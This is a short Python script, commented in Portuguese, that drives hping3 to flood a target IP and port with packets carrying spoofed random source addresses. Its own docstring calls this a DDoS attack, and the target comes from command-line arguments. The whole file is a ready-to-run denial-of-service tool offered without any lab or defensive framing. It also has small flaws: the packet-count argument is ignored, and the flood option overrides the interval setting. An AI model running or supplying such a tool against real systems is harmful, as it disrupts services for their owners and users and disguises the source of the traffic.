import os
import sys
import subprocess

# Diretório para armazenar os logs
LOG_DIR = "/logs"
os.makedirs(LOG_DIR, exist_ok=True)

def run_hping3_ddos(target_ip, target_port, packet_count, interval):
    """
    Executa um ataque DDoS no alvo especificado usando hping3.
    
    Args:
        target_ip (str): IP do alvo.
        target_port (int): Porta do alvo (default: 80).
        packet_count (int): Número de pacotes a serem enviados (default: 10000).
        interval (str): Intervalo entre pacotes (default: 'u1000' -> 1000 microsegundos).
    """
    log_file = os.path.join(LOG_DIR, f"hping3_ddos_{target_ip}.log")
    print(f"Executando ataque DDoS com hping3 em {target_ip}:{target_port}...")

    command = [
        "hping3",
        "--flood",
        "--rand-source",
        "-p", str(target_port),
        "-i", interval,
        target_ip
    ]

    with open(log_file, 'w') as f:
        subprocess.run(command, stdout=f, stderr=subprocess.STDOUT, universal_newlines=True, text=True)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python3 hping3_ddos.py <TARGET_IP> [TARGET_PORT] [PACKET_COUNT] [INTERVAL]")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    packet_count = int(sys.argv[3]) if len(sys.argv) > 3 else 10000
    interval = sys.argv[4] if len(sys.argv) > 4 else 'u1000'
    
    print(f"{target_ip, target_port, packet_count, interval}")
    run_hping3_ddos(target_ip, target_port, packet_count, interval)

